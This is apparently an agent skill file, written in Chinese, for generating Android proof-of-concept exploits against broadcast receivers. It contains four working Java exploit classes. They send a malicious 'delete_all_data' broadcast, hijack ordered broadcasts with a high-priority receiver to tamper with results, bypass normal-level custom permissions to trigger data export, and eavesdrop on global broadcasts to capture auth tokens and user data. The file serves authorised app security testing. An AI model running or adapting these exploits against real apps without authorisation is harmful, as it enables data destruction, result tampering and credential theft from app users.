---
name: poc-app-broadcast
description: Broadcast 组件攻击 PoC — 覆盖动态广播滥用、有序广播劫持、权限绕过、本地广播泄露 4 种漏洞类型
---

# Broadcast 组件攻击 PoC

广播是 Android 消息传递机制，攻击者可通过发送恶意广播触发目标 Receiver 执行危险操作。

## 漏洞类型索引

| 漏洞 | 等级 | PoC 类名 |
|------|------|---------|
| 动态广播滥用 | MEDIUM | `BroadcastDynamicAbuseExploit` |
| 有序广播劫持 | MEDIUM | `BroadcastOrderedHijackExploit` |
| 权限绕过 | HIGH | `BroadcastPermissionBypassExploit` |
| 本地广播泄露 | MEDIUM | `BroadcastLocalLeakExploit` |

## BroadcastDynamicAbuseExploit

向动态注册的 Receiver 发送恶意广播，触发敏感操作。

```java
public class BroadcastDynamicAbuseExploit extends Exploit {
    @Override
    public void execute() {
        Intent intent = new Intent("com.target.INTERNAL_ACTION");
        intent.putExtra("command", "delete_all_data");
        intent.putExtra("confirm", true);
        context.sendBroadcast(intent);
    }
}
```

## BroadcastOrderedHijackExploit

注册高优先级 Receiver 拦截有序广播，篡改或丢弃结果。

```java
public class BroadcastOrderedHijackExploit extends Exploit {
    @Override
    public void execute() {
        // 1. 注册高优先级拦截 Receiver
        IntentFilter filter = new IntentFilter("com.target.ORDERED_ACTION");
        filter.setPriority(999); // 最高优先级

        BroadcastReceiver interceptor = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
                log("Intercepted ordered broadcast");
                // 篡改结果
                setResultData("tampered_result");
                // 或直接终止广播传播
                // abortBroadcast();
            }
        };
        context.registerReceiver(interceptor, filter, Context.RECEIVER_EXPORTED);

        // 2. 发送有序广播触发拦截
        Intent intent = new Intent("com.target.ORDERED_ACTION");
        intent.putExtra("key", "original_value");
        context.sendOrderedBroadcast(intent, null);

        // 3. 清理
        context.unregisterReceiver(interceptor);
    }
}
```

## BroadcastPermissionBypassExploit

声明与目标相同的 normal 级别自定义权限，绕过广播保护。

```java
public class BroadcastPermissionBypassExploit extends Exploit {
    @Override
    public void execute() {
        // 前提：目标使用 protectionLevel="normal" 的自定义权限保护广播
        // PoC 的 AndroidManifest.xml 中需声明相同权限：
        // <uses-permission android:name="com.target.PERMISSION_RECEIVE" />

        Intent intent = new Intent("com.target.PROTECTED_ACTION");
        intent.putExtra("sensitive_command", "export_data");
        // 使用目标声明的权限发送广播
        context.sendBroadcast(intent, "com.target.PERMISSION_RECEIVE");
    }
}
```

> 注意：需在 PoC 的 `AndroidManifest.xml` 中声明目标使用的自定义权限。`protectionLevel="normal"` 的权限任何 app 都可声明，`signature` 级别则不行。

## BroadcastLocalLeakExploit

注册 Receiver 监听目标应用发出的全局广播，截获敏感数据。

```java
public class BroadcastLocalLeakExploit extends Exploit {
    @Override
    public void execute() {
        // 监听目标应用误用全局广播发送的敏感数据
        IntentFilter filter = new IntentFilter("com.target.SENSITIVE_DATA_ACTION");

        BroadcastReceiver listener = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
                String token = intent.getStringExtra("auth_token");
                String userData = intent.getStringExtra("user_data");
                log("Leaked token: " + token);
                log("Leaked user data: " + userData);
            }
        };
        context.registerReceiver(listener, filter, Context.RECEIVER_EXPORTED);

        // 保持监听，等待目标应用发送广播
        log("Listening for sensitive broadcasts... wait for target app action");
        // 实际场景中需保持 Receiver 注册，在 onDestroy 中 unregister
    }
}
```
